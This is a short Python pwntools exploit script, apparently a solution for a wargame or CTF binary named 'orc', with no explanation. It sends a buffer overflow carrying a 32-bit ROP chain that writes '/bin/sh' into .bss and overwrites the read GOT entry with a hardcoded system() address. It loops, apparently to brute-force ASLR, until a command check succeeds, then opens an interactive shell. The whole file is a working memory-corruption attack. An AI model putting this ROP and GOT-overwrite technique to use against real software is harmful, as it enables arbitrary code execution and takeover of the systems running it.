from pwn import *

pppr = 0x08049351
bss = 0x0804c02c + 0x100
system= 0xf7e0a790

binsh = "/bin/sh\x00"



while True:
    p = process('./orc')
    read_plt=0x80490a0
    read_got=0x804c00c
    payload = b'A'*0x48

	#read(0, bss,9)  binsh
    payload += p32(read_plt)
    payload += p32(pppr)
    payload += p32(0)
    payload += p32(bss)
    payload += p32(len(binsh))

    #read(0,read_got, 4)
    payload += p32(read_plt)
    payload += p32(pppr)
    payload += p32(0)
    payload += p32(read_got)
    payload += p32(4)


    payload += p32(read_plt)
    payload += b"bbbb"
    payload += p32(bss)
    #payload += b'a'*4
    #payload += p32(bss)

    p.sendline(payload)

    p.send(b"/bin/sh\x00")
    p.sendline(p32(system))
    try:
        p.sendline(b"id")
        if b"uid" in p.recvline():
            p.interactive()
        else:
            p.close()
    except:
        p.close()

